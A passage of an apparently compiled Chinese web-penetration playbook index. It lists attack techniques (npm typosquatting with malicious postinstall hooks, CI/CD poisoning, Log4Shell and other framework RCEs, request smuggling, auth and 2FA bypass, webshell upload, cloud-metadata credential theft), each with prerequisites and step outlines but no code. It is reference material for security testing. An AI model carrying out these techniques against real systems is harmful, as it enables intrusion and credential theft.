1. 识别可利用的XSS和Clickjacking组合
2. Self-XSS + Clickjacking组合利用
3. 反射型XSS + iframe嵌套利用

---

## Source: 02-supply-chain-attacks.md

Path: references\web-playbook-02-supply-chain-attacks.md

# 供应链攻击
English: Supply Chain Attacks
- Entry Count: 3
- Use this file to shortlist relevant payloads, then open the linked source markdown for the full workflow and commands.
## NPM包名仿冒(Typosquatting)
- ID: supply-typosquat
- Difficulty: intermediate
- Subcategory: 包管理器投毒
- Tags: 供应链, NPM, Typosquatting, 包投毒, postinstall
- Original Extracted Source: original extracted web-security-wiki source/supply-typosquat.md
Description:
通过注册与流行NPM包名高度相似的恶意包(如lodash→1odash, colors→co1ors)，诱导开发者误安装。恶意包在install/postinstall钩子中执行反弹Shell、窃取环境变量或植入后门。
Prerequisites:
- NPM账号
- 了解目标项目依赖
- 恶意包基础设施
Execution Outline:
1. 1. 侦察目标依赖
2. 2. 生成仿冒包名
3. 3. 构造恶意包
4. 4. 检测与取证
## CI/CD管道投毒
- ID: supply-ci-poison
- Difficulty: advanced
- Subcategory: CI/CD攻击
- Tags: 供应链, CI/CD, GitHub Actions, Jenkins, Pipeline
- Original Extracted Source: original extracted web-security-wiki source/supply-ci-poison.md
Description:
通过恶意Pull Request、Actions注入或构建脚本篡改来攻击CI/CD管道。攻击者可窃取构建密钥、投毒构建产物或在部署流程中植入后门代码。
Prerequisites:
- 目标使用公开CI/CD
- 可提交PR或Fork
Execution Outline:
1. 1. 识别CI/CD配置
2. 2. PR触发的工作流注入
3. 3. Actions表达式注入
4. 4. 构建产物投毒
## 依赖混淆攻击
- ID: supply-dependency-confusion
- Difficulty: intermediate
- Subcategory: 依赖混淆
- Tags: 供应链, 依赖混淆, NPM, PyPI, Dependency Confusion
- Original Extracted Source: original extracted web-security-wiki source/supply-dependency-confusion.md
Description:
利用包管理器在公共注册表和私有注册表之间的解析优先级漏洞。当企业使用内部包名时，攻击者在公共NPM/PyPI注册更高版本号的同名包，包管理器会优先安装公共高版本包从而执行恶意代码。
Prerequisites:
- 已知目标内部包名
- 公共注册表账号
Execution Outline:
1. 1. 发现内部包名
2. 2. 在公共注册表注册同名包
3. 3. 监控DNS回调确认命中
4. 4. 影响评估与报告

---

## Source: 03-cache-and-cdn-security.md

Path: references\web-playbook-03-cache-and-cdn-security.md

# 缓存与CDN安全
English: Cache & CDN Security
- Entry Count: 3
- Use this file to shortlist relevant payloads, then open the linked source markdown for the full workflow and commands.
## 缓存投毒
- ID: cache-poisoning
- Difficulty: advanced
- Subcategory: 缓存投毒
- Tags: cache, poisoning, web-cache
- Original Extracted Source: original extracted web-security-wiki source/cache-poisoning.md
Description:
Web缓存投毒攻击
Prerequisites:
- 目标使用缓存
- 缓存键配置不当
Execution Outline:
1. 探测缓存
2. 未键入头
3. 缓存投毒
4. Fat GET
## 缓存欺骗
- ID: cache-deception
- Difficulty: intermediate
- Subcategory: Deception
- Tags: cache, deception, auth
- Original Extracted Source: original extracted web-security-wiki source/cache-deception.md
Description:
利用Web缓存和服务器路径解析的差异，诱导CDN/缓存层缓存包含敏感信息的动态页面
Prerequisites:
- 目标使用CDN或反向代理缓存
- 路径解析存在差异(后端忽略路径后缀)
- 缓存策略基于URL扩展名
Execution Outline:
1. 探测缓存行为
2. 路径混淆缓存欺骗
3. 高级缓存欺骗变体
4. 完整攻击流程验证
## CDN绕过
- ID: cdn-bypass
- Difficulty: intermediate
- Subcategory: CDN
- Tags: cdn, bypass, recon
- Original Extracted Source: original extracted web-security-wiki source/cdn-bypass.md
Description:
绕过CDN查找真实IP
Prerequisites:
- 目标使用CDN
Execution Outline:
1. 历史DNS
2. 邮件头
3. DNS历史与证书透明度查询
4. 子域名与相关服务探测真实IP

---

## Source: 04-open-redirect.md

Path: references\web-playbook-04-open-redirect.md

# 开放重定向
English: Open Redirect
- Entry Count: 3
- Use this file to shortlist relevant payloads, then open the linked source markdown for the full workflow and commands.
## 基础开放重定向
- ID: redirect-basic
- Difficulty: beginner
- Subcategory: 基础
- Tags: redirect, url, phishing
- Original Extracted Source: original extracted web-security-wiki source/redirect-basic.md
Description:
URL跳转漏洞利用
Prerequisites:
- 目标参数控制跳转地址
Execution Outline:
1. 直接跳转
2. 绕过验证
3. 斜杠绕过
## 重定向绕过
- ID: redirect-bypass
- Difficulty: intermediate
- Subcategory: Bypass
- Tags: redirect, bypass
- Original Extracted Source: original extracted web-security-wiki source/redirect-bypass.md
Description:
开放重定向绕过技巧
Prerequisites:
- 存在重定向参数
Execution Outline:
1. URL编码
2. @符号
3. 反斜杠
## 重定向到SSRF
- ID: redirect-ssrf
- Difficulty: intermediate
- Subcategory: SSRF
- Tags: redirect, ssrf
- Original Extracted Source: original extracted web-security-wiki source/redirect-ssrf.md
Description:
利用开放重定向漏洞作为跳板将SSRF探测引导到内部网络，绕过SSRF的URL白名单/黑名单限制
Prerequisites:
- 目标存在开放重定向(Open Redirect)漏洞
- 目标存在SSRF功能点(URL参数/Webhook等)
- SSRF过滤仅检查初始URL而不跟踪重定向
Execution Outline:
1. 识别开放重定向点
2. 通过重定向绕过SSRF过滤
3. 短链接和DNS重绑定辅助
4. 完整利用链: 重定向→SSRF→内网探测

---

## Source: 05-framework-vulnerabilities.md

Path: references\web-playbook-05-framework-vulnerabilities.md

# 框架漏洞
English: Framework Vulnerabilities
- Entry Count: 18
- Use this file to shortlist relevant payloads, then open the linked source markdown for the full workflow and commands.
## Log4j RCE (Log4Shell)
- ID: log4j-rce
- Difficulty: intermediate
- Subcategory: Log4j
- Tags: log4j, rce, cve-2021-44228, log4shell
- Original Extracted Source: original extracted web-security-wiki source/log4j-rce.md
Description:
Apache Log4j远程代码执行漏洞
Prerequisites:
- 使用Log4j 2.x版本
- 用户输入被记录到日志
Execution Outline:
1. 1. 探测漏洞
2. 2. DNS外带测试
3. 3. 构造恶意LDAP服务器
4. 4. 获取Shell
## Spring Actuator漏洞
- ID: spring-actuator
- Difficulty: intermediate
- Subcategory: Spring
- Tags: spring, actuator, rce, java
- Original Extracted Source: original extracted web-security-wiki source/spring-actuator.md
Description:
Spring Boot Actuator端点安全漏洞
Prerequisites:
- Spring Boot应用
- Actuator端点暴露
Execution Outline:
1. 1. 探测Actuator端点
2. 2. 获取敏感信息
3. 3. 下载堆转储
4. 4. env端点RCE
## Fastjson RCE
- ID: fastjson-rce
- Difficulty: advanced
- Subcategory: Fastjson
- Tags: fastjson, rce, deserialization, java
- Original Extracted Source: original extracted web-security-wiki source/fastjson-rce.md
Description:
Alibaba Fastjson反序列化远程代码执行
Prerequisites:
- 使用Fastjson库
- 存在反序列化点
Execution Outline:
1. 1. 探测Fastjson
2. 2. JNDI注入
3. 3. 搭建恶意服务
4. 4. 绕过AutoType检查
## Spring SpEL注入
- ID: spring-spel
- Difficulty: intermediate
- Subcategory: Spring SpEL
- Tags: spring, spel, expression, rce
- Original Extracted Source: original extracted web-security-wiki source/spring-spel.md
Description:
Spring表达式语言注入攻击
Prerequisites:
- 使用Spring框架
- 存在SpEL注入点
Execution Outline:
1. 1. 探测SpEL注入
2. 2. 命令执行
3. 3. 文件读取
4. 4. DNS外带
## Spring Cloud漏洞
- ID: spring-cloud
- Difficulty: advanced
- Subcategory: Spring Cloud
- Tags: spring, cloud, rce, deserialization
- Original Extracted Source: original extracted web-security-wiki source/spring-cloud.md
Description:
Spring Cloud相关漏洞利用
Prerequisites:
- 使用Spring Cloud
- 存在漏洞版本
Execution Outline:
1. 1. Spring Cloud Gateway RCE
2. 2. Spring Cloud Function SpEL
3. 3. Spring Cloud Netflix
## Struts2远程代码执行
- ID: struts2-rce
- Difficulty: intermediate
- Subcategory: Struts2
- Tags: struts2, rce, java, apache
- Original Extracted Source: original extracted web-security-wiki source/struts2-rce.md
Description:
Apache Struts2框架RCE漏洞
Prerequisites:
- 使用Struts2框架
- 存在漏洞版本
Execution Outline:
1. 1. S2-045漏洞
2. 2. S2-046漏洞
3. 3. S2-057漏洞
4. 4. S2-061/S2-062漏洞
## Struts2 OGNL表达式注入
- ID: struts2-ognl
- Difficulty: advanced
- Subcategory: Struts2 OGNL
- Tags: struts2, ognl, expression, injection
- Original Extracted Source: original extracted web-security-wiki source/struts2-ognl.md
Description:
Struts2 OGNL表达式注入技术详解
Prerequisites:
- 使用Struts2框架
- 存在OGNL注入点
Execution Outline:
1. 1. OGNL基础语法
2. 2. 绕过安全限制
3. 3. 命令执行技巧
4. 4. 文件操作
## WebLogic远程代码执行
- ID: weblogic-rce
- Difficulty: advanced
- Subcategory: WebLogic
- Tags: weblogic, rce, java, oracle
- Original Extracted Source: original extracted web-security-wiki source/weblogic-rce.md
Description:
Oracle WebLogic Server RCE漏洞
Prerequisites:
- 使用WebLogic Server
- 存在漏洞版本
Execution Outline:
1. 1. CVE-2017-10271
2. 2. CVE-2019-2725
3. 3. CVE-2020-14882
## WebLogic T3协议攻击
- ID: weblogic-t3
- Difficulty: advanced
- Subcategory: WebLogic T3
- Tags: weblogic, t3, deserialization, java
- Original Extracted Source: original extracted web-security-wiki source/weblogic-t3.md
Description:
WebLogic T3协议反序列化漏洞
Prerequisites:
- WebLogic开放T3端口
- 存在漏洞版本
Execution Outline:
1. 1. 探测T3服务
2. 2. 使用工具攻击
3. 3. 构造恶意T3请求
## WebLogic IIOP协议攻击
- ID: weblogic-iiop
- Difficulty: advanced
- Subcategory: WebLogic IIOP
- Tags: weblogic, iiop, deserialization, corba
- Original Extracted Source: original extracted web-security-wiki source/weblogic-iiop.md
Description:
WebLogic IIOP协议反序列化漏洞
Prerequisites:
- WebLogic开放IIOP端口
- 存在漏洞版本
Execution Outline:
1. 1. 探测IIOP服务
2. 2. CVE-2020-2551
3. 3. 构造IIOP请求
## ThinkPHP远程代码执行
- ID: thinkphp-rce
- Difficulty: intermediate
- Subcategory: ThinkPHP
- Tags: thinkphp, rce, php, framework
- Original Extracted Source: original extracted web-security-wiki source/thinkphp-rce.md
Description:
ThinkPHP框架RCE漏洞
Prerequisites:
- 使用ThinkPHP框架
- 存在漏洞版本
Execution Outline:
1. 1. ThinkPHP 5.x RCE
2. 2. ThinkPHP 5.1.x RCE
3. 3. ThinkPHP 5.0.23 RCE
4. 4. 信息收集
## Laravel远程代码执行
- ID: laravel-rce
- Difficulty: intermediate
- Subcategory: Laravel
- Tags: laravel, rce, php, framework
- Original Extracted Source: original extracted web-security-wiki source/laravel-rce.md
Description:
Laravel框架RCE漏洞
Prerequisites:
- 使用Laravel框架
- 存在漏洞版本或配置
Execution Outline:
1. 1. CVE-2021-3129
2. 2. 调试模式信息泄露
3. 3. .env文件泄露
4. 4. APP_KEY利用
## Apache Shiro反序列化
- ID: shiro-deserialize
- Difficulty: intermediate
- Subcategory: Apache Shiro
- Tags: shiro, deserialization, java, rememberme
- Original Extracted Source: original extracted web-security-wiki source/shiro-deserialize.md
Description:
Apache Shiro RememberMe反序列化漏洞
Prerequisites:
- 使用Apache Shiro
- 存在漏洞版本
Execution Outline:
1. 1. 检测Shiro
2. 2. 使用ysoserial生成payload
3. 3. 发送恶意请求
4. 4. 常见密钥列表
## JBoss漏洞利用
- ID: jboss-vuln
- Difficulty: intermediate
- Subcategory: JBoss
- Tags: jboss, rce, java, deserialization
- Original Extracted Source: original extracted web-security-wiki source/jboss-vuln.md
Description:
JBoss应用服务器漏洞
Prerequisites:
- 使用JBoss服务器
- 存在漏洞版本
Execution Outline:
1. 1. JMXInvokerServlet反序列化
2. 2. JMX Console部署War包
3. 3. BSHDeployer部署
4. 4. 使用工具
## Apache Tomcat漏洞
- ID: tomcat-vuln
- Difficulty: intermediate
- Subcategory: Tomcat
- Tags: tomcat, rce, java, manager
- Original Extracted Source: original extracted web-security-wiki source/tomcat-vuln.md
Description:
Apache Tomcat服务器漏洞利用
Prerequisites:
- 使用Tomcat服务器
- 存在漏洞版本或配置
Execution Outline:
1. 1. Manager App弱口令
2. 2. 部署War包
3. 3. CVE-2020-1938 Ghostcat
4. 4. PUT方法任意文件写入
## Django框架漏洞
- ID: django-vuln
- Difficulty: intermediate
- Subcategory: Django
- Tags: django, python, framework, sql
- Original Extracted Source: original extracted web-security-wiki source/django-vuln.md
Description:
Django框架安全漏洞
Prerequisites:
- 使用Django框架
- 存在漏洞版本
Execution Outline:
1. 1. SQL注入
2. 2. 调试模式信息泄露
3. 3. SECRET_KEY利用
4. 4. 路径遍历
## Flask框架漏洞
- ID: flask-vuln
- Difficulty: intermediate
- Subcategory: Flask
- Tags: flask, python, framework, ssti
- Original Extracted Source: original extracted web-security-wiki source/flask-vuln.md
Description:
Flask框架安全漏洞
Prerequisites:
- 使用Flask框架
- 存在漏洞配置
Execution Outline:
1. 1. SSTI模板注入
2. 2. SECRET_KEY利用
3. 3. 调试模式RCE
4. 4. PIN码绕过
## WebLogic XMLDecoder
- ID: weblogic-xmldecoder
- Difficulty: intermediate
- Subcategory: WebLogic
- Tags: weblogic, xmldecoder, rce
- Original Extracted Source: original extracted web-security-wiki source/weblogic-xmldecoder.md
Description:
利用WebLogic Server中XMLDecoder反序列化漏洞(CVE-2017-10271/CVE-2017-3506)实现远程代码执行
Prerequisites:
- 目标运行WebLogic Server
- 存在/wls-wsat/或/_async/路径
- XMLDecoder组件未被禁用
- WebLogic版本存在漏洞(10.3.6.0/12.1.3.0等)
Execution Outline:
1. 探测WebLogic版本和路径
2. CVE-2017-10271 XMLDecoder RCE
3. CVE-2019-2725 反序列化RCE
4. 写入Webshell获取持久权限

---

## Source: 06-request-smuggling.md

Path: references\web-playbook-06-request-smuggling.md

# 请求走私
English: Request Smuggling
- Entry Count: 4
- Use this file to shortlist relevant payloads, then open the linked source markdown for the full workflow and commands.
## CL-TE请求走私
- ID: smuggling-cl-te
- Difficulty: advanced
- Subcategory: CL-TE
- Tags: smuggling, request, http
- Original Extracted Source: original extracted web-security-wiki source/smuggling-cl-te.md
Description:
Content-Length与Transfer-Encoding走私
Prerequisites:
- 目标使用多层代理
- 前后端处理差异
Execution Outline:
1. CL-TE基础
2. TE-CL基础
3. TE-TE
## CL-CL走私
- ID: smuggling-cl-cl
- Difficulty: advanced
- Subcategory: CL-CL
- Tags: smuggling, cl-cl, http
- Original Extracted Source: original extracted web-security-wiki source/smuggling-cl-cl.md
Description:
利用前端代理和后端服务器同时处理Content-Length头但对多个CL头的处理差异实现HTTP请求走私
Prerequisites:
- 存在前端代理(如HAProxy/Nginx)+后端服务器架构
- 两端对Content-Length头的解析存在差异
- 理解HTTP请求走私原理
Execution Outline:
1. 检测CL-CL走私条件
2. CL-CL请求走私POC
3. 利用CL-CL走私绕过前端访问控制
## TE-CL走私
- ID: smuggling-te-cl
- Difficulty: expert
- Subcategory: TE-CL
- Tags: smuggling, te-cl, http
- Original Extracted Source: original extracted web-security-wiki source/smuggling-te-cl.md
Description:
利用前端使用Transfer-Encoding而后端使用Content-Length的差异实现HTTP请求走私
Prerequisites:
- 前端代理优先处理Transfer-Encoding
- 后端服务器优先处理Content-Length
- 理解chunked编码格式
Execution Outline:
1. 检测TE-CL差异
2. TE-CL走私POC
3. TE-CL走私实现请求劫持
## TE-TE走私
- ID: smuggling-te-te
- Difficulty: expert
- Subcategory: TE-TE
- Tags: smuggling, te-te, http
- Original Extracted Source: original extracted web-security-wiki source/smuggling-te-te.md
Description:
利用前端和后端对Transfer-Encoding头的不同混淆变体的处理差异实现请求走私
Prerequisites:
- 前后端都支持Transfer-Encoding
- 可以通过TE头混淆使一端忽略TE
- 了解chunked编码和HTTP走私原理
Execution Outline:
1. TE混淆变体探测
2. TE-TE走私利用(前端忽略混淆TE)
3. TE-TE缓存投毒攻击

---

## Source: 07-authentication-vulnerabilities.md

Path: references\web-playbook-07-authentication-vulnerabilities.md

# 认证漏洞
English: Authentication Vulnerabilities
- Entry Count: 10
- Use this file to shortlist relevant payloads, then open the linked source markdown for the full workflow and commands.
## 认证绕过
- ID: auth-bypass
- Difficulty: intermediate
- Subcategory: 认证绕过
- Tags: auth, bypass, authentication
- Original Extracted Source: original extracted web-security-wiki source/auth-bypass.md
Description:
Web应用认证绕过技术
Prerequisites:
- 目标存在认证机制
- 认证实现存在缺陷
Execution Outline:
1. SQL注入绕过
2. 数组绕过
3. 类型转换
4. JSON绕过
## 暴力破解
- ID: auth-brute
- Difficulty: beginner
- Subcategory: 暴力破解
- Tags: auth, brute-force, password
- Original Extracted Source: original extracted web-security-wiki source/auth-brute.md
Description:
自动化密码猜测攻击
Prerequisites:
- 无验证码
- 无锁定策略
Execution Outline:
1. Pitchfork
2. Cluster bomb
3. 基于响应差异的用户名枚举
4. 验证码/OTP爆破与绕过
## 会话劫持
- ID: auth-session
- Difficulty: intermediate
- Subcategory: 会话管理
- Tags: auth, session, hijack
- Original Extracted Source: original extracted web-security-wiki source/auth-session.md
Description:
利用会话管理缺陷劫持或伪造用户会话，获取未授权访问权限
Prerequisites:
- 目标使用基于Cookie或Token的会话管理
- 可以截获或预测会话标识符
- 网络通信未完全加密(HTTP)或存在XSS
Execution Outline:
1. 会话Cookie属性分析
2. 会话固定攻击(Session Fixation)
3. 会话劫持(HTTP嗅探)
4. 会话预测(弱随机性)
## 密码重置漏洞
- ID: auth-password-reset
- Difficulty: intermediate
- Subcategory: 逻辑漏洞
- Tags: auth, password-reset, logic
- Original Extracted Source: original extracted web-security-wiki source/auth-password-reset.md
Description:
绕过密码重置流程
Prerequisites:
- 密码重置功能存在逻辑缺陷
Execution Outline:
1. Host头投毒
2. Token爆破
3. 密码重置Token可预测性分析
4. 密码重置流程逻辑缺陷
## OAuth漏洞
- ID: auth-oauth
- Difficulty: advanced
- Subcategory: OAuth
- Tags: auth, oauth, redirect
- Original Extracted Source: original extracted web-security-wiki source/auth-oauth.md
Description:
OAuth认证流程漏洞
Prerequisites:
- 使用OAuth登录
Execution Outline:
1. CSRF攻击
2. Redirect URI
3. OAuth State参数缺失/可预测CSRF
4. Token窃取与Scope越权
## SAML漏洞
- ID: auth-saml
- Difficulty: advanced
- Subcategory: SAML
- Tags: auth, saml, xml
- Original Extracted Source: original extracted web-security-wiki source/auth-saml.md
Description:
SAML断言攻击
Prerequisites:
- 使用SAML SSO
Execution Outline:
1. XML签名绕过
2. XXE攻击
3. SAML Response篡改与重放
4. SAML签名绕过高级技术
## 2FA绕过
- ID: auth-2fa
- Difficulty: intermediate
- Subcategory: 2FA
- Tags: auth, 2fa, mfa
- Original Extracted Source: original extracted web-security-wiki source/auth-2fa.md
Description:
绕过双因素认证
Prerequisites:
- 开启2FA
Execution Outline:
1. 直接访问
2. 验证码爆破
3. 逻辑绕过
## 验证码绕过
- ID: auth-captcha
- Difficulty: beginner
- Subcategory: 验证码
- Tags: auth, captcha, bypass
- Original Extracted Source: original extracted web-security-wiki source/auth-captcha.md
Description:
绕过图形验证码
Prerequisites:
- 存在验证码
Execution Outline:
1. 重复使用
2. 空值绕过
3. 删除参数
## 记住我漏洞
- ID: auth-remember-me
- Difficulty: intermediate
- Subcategory: 会话管理
- Tags: auth, remember-me, cookie
- Original Extracted Source: original extracted web-security-wiki source/auth-remember-me.md
Description:
Remember Me功能漏洞
Prerequisites:
- 开启Remember Me
Execution Outline:
1. Cookie伪造
2. Base64解码
3. 记住密码Token逆向分析
4. Shiro RememberMe反序列化RCE
## JWT认证漏洞
- ID: auth-jwt
- Difficulty: intermediate
- Subcategory: JWT
- Tags: auth, jwt, token
- Original Extracted Source: original extracted web-security-wiki source/auth-jwt.md
Description:
利用JWT(JSON Web Token)实现缺陷伪造或篡改认证令牌，实现未授权访问或权限提升
Prerequisites:
- 目标使用JWT进行认证
- 可以获取或拦截JWT令牌
- JWT库存在已知漏洞或服务端配置不当
Execution Outline:
1. JWT解码与分析
2. Algorithm None攻击
3. HS256密钥爆破
4. RS256→HS256算法混淆攻击

---

## Source: 08-file-vulnerabilities.md

Path: references\web-playbook-08-file-vulnerabilities.md

# 文件漏洞
English: File Vulnerabilities
- Entry Count: 7
- Use this file to shortlist relevant payloads, then open the linked source markdown for the full workflow and commands.
## 文件上传绕过
- ID: file-upload-bypass
- Difficulty: intermediate
- Subcategory: 文件上传
- Tags: upload, bypass, webshell
- Original Extracted Source: original extracted web-security-wiki source/file-upload-bypass.md
Description:
文件上传限制绕过技术
Prerequisites:
- 目标存在文件上传功能
- 存在上传限制
Execution Outline:
1. 扩展名绕过
2. Content-Type
3. 图片马
4. 空格绕过
## 任意文件下载
- ID: file-download
- Difficulty: beginner
- Subcategory: 下载
- Tags: file-download, lfi, leak
- Original Extracted Source: original extracted web-security-wiki source/file-download.md
Description:
利用文件下载功能中的路径控制缺陷下载服务器上的任意敏感文件
Prerequisites:
- 目标存在文件下载功能
- 文件路径参数可控
- 服务端未对路径进行严格过滤
Execution Outline:
1. 识别文件下载接口
2. 路径遍历下载敏感文件
3. 下载源码与数据库配置
4. 自动化批量敏感文件探测
## 条件竞争
- ID: file-competition
- Difficulty: advanced
- Subcategory: Race Condition
- Tags: race-condition, file-upload
- Original Extracted Source: original extracted web-security-wiki source/file-competition.md
Description:
利用文件上传/处理过程中的竞态条件(Race Condition)，在安全检查与文件使用之间的时间窗口内执行恶意操作
Prerequisites:
- 目标存在文件上传功能
- 服务端先上传后检查的处理流程
- 可以高并发访问上传的文件
- 了解临时文件存储路径
Execution Outline:
1. 识别竞态条件窗口
2. 竞态条件利用 - 上传与访问并发
3. Python并发竞态利用脚本
4. .htaccess竞态写入
## 路径遍历
- ID: file-traversal
- Difficulty: beginner
- Subcategory: Traversal
- Tags: traversal, file
- Original Extracted Source: original extracted web-security-wiki source/file-traversal.md
Description:
利用路径遍历(../)序列突破文件访问的目录限制，读取或写入Web根目录以外的任意文件
Prerequisites:
- 目标存在文件读取/包含功能
- 文件路径参数可控
- 服务端路径过滤不严格
Execution Outline:
1. 基础路径遍历测试
2. 编码绕过路径过滤
3. Windows特有路径遍历
4. LFI到RCE升级
## Zip Slip
- ID: file-zip-slip
- Difficulty: intermediate
- Subcategory: Zip
- Tags: zip-slip, file, rce
- Original Extracted Source: original extracted web-security-wiki source/file-zip-slip.md
Description:
利用恶意构造的压缩包文件(ZIP/TAR)中的路径遍历实现任意文件写入，覆盖服务器上的关键文件或写入Webshell
Prerequisites:
- 目标存在ZIP/TAR文件上传并自动解压功能
- 解压库未对文件名中的路径遍历进行过滤
- 了解Web根目录或其他关键目录的路径
Execution Outline:
1. 探测ZIP上传和解压功能
2. 构造Zip Slip恶意压缩包
3. 上传并验证Zip Slip
4. TAR包Zip Slip变体
## MIME类型绕过
- ID: file-mime
- Difficulty: beginner
- Subcategory: MIME
- Tags: mime, bypass
- Original Extracted Source: original extracted web-security-wiki source/file-mime.md
Description:
通过伪造MIME类型(Content-Type)绕过文件上传的类型检查，上传恶意可执行文件
Prerequisites:
- 目标存在文件上传功能
- 服务端仅通过Content-Type判断文件类型
- 了解目标允许的MIME类型
Execution Outline:
1. 探测文件类型检查机制
2. MIME类型伪造上传Webshell
3. Magic Bytes伪造
4. 验证上传结果
## 空字节截断
- ID: file-null-byte
- Difficulty: intermediate
- Subcategory: Null Byte
- Tags: null-byte, bypass
- Original Extracted Source: original extracted web-security-wiki source/file-null-byte.md
Description:
利用空字节(%00/\x00)截断文件名的扩展名验证，绕过文件上传白名单限制
Prerequisites:
- 目标使用白名单验证文件扩展名
- 后端语言或库受空字节截断影响(PHP<5.3.4, Java旧版本)
- 服务端在路径拼接中存在截断点
Execution Outline:
1. 空字节截断原理与环境检测
2. 文件上传空字节截断
3. 文件包含空字节截断
4. 现代替代方案(PHP>=5.3.4)

---

## Source: 09-business-logic-vulnerabilities.md

Path: references\web-playbook-09-business-logic-vulnerabilities.md

# 业务逻辑漏洞
English: Business Logic Vulnerabilities
- Entry Count: 5
- Use this file to shortlist relevant payloads, then open the linked source markdown for the full workflow and commands.
## IDOR越权访问
- ID: biz-idor
- Difficulty: beginner
- Subcategory: 越权漏洞
- Tags: IDOR, 越权, 业务逻辑, OWASP, A01
- Original Extracted Source: original extracted web-security-wiki source/biz-idor.md
Description:
不安全的直接对象引用(IDOR)，通过篡改请求参数中的对象ID越权访问他人数据。攻击者可遍历用户ID、订单号等参数获取未授权资源。
Prerequisites:
- 目标存在基于ID的资源访问接口
- 已登录普通用户账号
Execution Outline:
1. 1. 识别可遍历参数
2. 2. 水平越权测试
3. 3. 垂直越权测试
4. 4. 参数污染越权
## 竞态条件攻击
- ID: biz-race-condition
- Difficulty: intermediate
- Subcategory: 竞态条件
- Tags: 竞态条件, Race Condition, TOCTOU, 并发, 业务逻辑
- Original Extracted Source: original extracted web-security-wiki source/biz-race-condition.md
Description:
利用服务端TOCTOU(Time-of-Check to Time-of-Use)漏洞，通过并发请求在检查与执行之间的时间窗口内多次触发同一操作，实现重复领券、重复提现、超额购买等业务逻辑突破。
Prerequisites:
- 目标存在余额/积分/优惠券等可量化资源操作
- Python/Turbo Intruder环境
Execution Outline:
1. 1. 识别竞态目标
2. 2. Python并发测试脚本
3. 3. Burp Turbo Intruder测试
4. 4. 验证竞态成功
## 支付逻辑篡改
- ID: biz-payment-tamper
- Difficulty: intermediate
- Subcategory: 支付安全
- Tags: 支付, 金额篡改, 业务逻辑, 0元购, 电商安全
- Original Extracted Source: original extracted web-security-wiki source/biz-payment-tamper.md
Description:
通过修改支付请求中的金额、数量、折扣等参数来操纵交易逻辑。常见于电商平台和在线支付系统中，可导致0元购、负价格、折扣叠加等严重业务风险。
Prerequisites:
- 目标存在支付/下单功能
- 可拦截和修改HTTP请求
Execution Outline:
1. 1. 金额篡改测试
2. 2. 数量与运费篡改
3. 3. 优惠券叠加与替换
4. 4. 支付回调篡改
## 密码重置逻辑缺陷
- ID: biz-password-reset
- Difficulty: intermediate
- Subcategory: 认证缺陷
- Tags: 密码重置, 认证绕过, 业务逻辑, 验证码, Host注入
- Original Extracted Source: original extracted web-security-wiki source/biz-password-reset.md
Description:
密码重置流程中的逻辑漏洞，包括重置令牌泄露、验证码爆破、响应操纵、Host头注入等攻击手法，可实现任意用户密码重置。
Prerequisites:
- 目标存在密码重置/找回功能
- 可拦截HTTP请求
Execution Outline:
1. 1. Host头注入窃取重置链接
2. 2. 验证码爆破
3. 3. 响应操纵绕过
4. 4. 重置令牌弱随机性
## 验证码绕过技术
- ID: biz-captcha-bypass
- Difficulty: beginner
- Subcategory: 验证码安全
- Tags: 验证码, CAPTCHA, 绕过, 短信验证码, 人机验证
- Original Extracted Source: original extracted web-security-wiki source/biz-captcha-bypass.md
Description:
绕过图形验证码、短信验证码、滑动验证等人机验证机制的各种技术手法，包括响应泄露、复用攻击、OCR识别、逻辑缺陷利用等。
Prerequisites:
- 目标存在验证码保护的功能
- Python环境
Execution Outline:
1. 1. 验证码响应泄露
2. 2. 验证码复用攻击
3. 3. 删除验证码参数
4. 4. 万能验证码

---

## Source: 10-prototype-pollution.md

Path: references\web-playbook-10-prototype-pollution.md

# 原型链污染
English: Prototype Pollution
- Entry Count: 3
- Use this file to shortlist relevant payloads, then open the linked source markdown for the full workflow and commands.
## 服务端原型链污染到RCE
- ID: proto-server-rce
- Difficulty: advanced
- Subcategory: 服务端利用
- Tags: 原型链, Prototype Pollution, RCE, Node.js, __proto__
- Original Extracted Source: original extracted web-security-wiki source/proto-server-rce.md
Description:
通过污染JavaScript对象原型链(__proto__/constructor.prototype)注入恶意属性，在Node.js服务端利用child_process或EJS/Pug等模板引擎的gadget链实现远程代码执行。
Prerequisites:
- 目标使用Node.js
- 存在JSON合并/深拷贝操作
- 可控JSON输入
Execution Outline:
1. 1. 检测原型链污染点
2. 2. EJS模板引擎RCE Gadget
3. 3. Pug模板引擎RCE Gadget
4. 4. 通用DoS/信息泄露Gadget
## 客户端原型链污染到XSS
- ID: proto-client-xss
- Difficulty: advanced
- Subcategory: 客户端利用
- Tags: 原型链, XSS, 客户端, jQuery, DOM, Prototype Pollution
- Original Extracted Source: original extracted web-security-wiki source/proto-client-xss.md
Description:
通过URL参数、postMessage或DOM操作污染前端JavaScript原型链，利用jQuery/DOM操作库的gadget在客户端实现XSS。攻击者可通过精心构造的URL链接诱导受害者触发漏洞。
Prerequisites:
- 目标前端使用易受影响的JS库
- 存在URL参数到对象转换的逻辑
Execution Outline:
1. 1. 识别客户端污染源
2. 2. jQuery html() Gadget
3. 3. DOMPurify绕过Gadget
4. 4. 自动化检测脚本
## 原型链污染结合NoSQL注入
- ID: proto-nosql-injection
- Difficulty: expert
- Subcategory: 组合利用
- Tags: 原型链, NoSQL, MongoDB, 认证绕过, 组合攻击
- Original Extracted Source: original extracted web-security-wiki source/proto-nosql-injection.md
Description:
将原型链污染与MongoDB/NoSQL注入组合利用。通过污染查询对象的原型链属性，绕过认证逻辑或构造恶意查询条件，实现认证绕过和数据泄露。
Prerequisites:
- 目标使用MongoDB
- 存在原型链污染点
- 存在查询构造逻辑
Execution Outline:
1. 1. 识别MongoDB查询注入点
2. 2. 原型链污染绕过查询校验
3. 3. 布尔盲注提取数据
4. 4. 数据库枚举与导出

---

## Source: 11-cloud-security-vulnerabilities.md

Path: references\web-playbook-11-cloud-security-vulnerabilities.md

# 云安全漏洞
English: Cloud Security Vulnerabilities
- Entry Count: 4
- Use this file to shortlist relevant payloads, then open the linked source markdown for the full workflow and commands.
## 云SSRF窃取元数据凭据
- ID: cloud-ssrf-metadata
- Difficulty: intermediate
- Subcategory: IMDS攻击
- Tags: 云安全, SSRF, AWS, GCP, Azure, IMDS, 元数据
- Original Extracted Source: original extracted web-security-wiki source/cloud-ssrf-metadata.md
Description:
利用SSRF漏洞访问云服务(AWS/GCP/Azure)的实例元数据服务(IMDS)获取临时IAM凭据。攻击者可通过获取的Access Key接管云资源，实现从Web漏洞到云环境的横向升级。
Prerequisites:
- 目标运行在云环境
- 存在SSRF漏洞
- 实例绑定了IAM角色
Execution Outline:
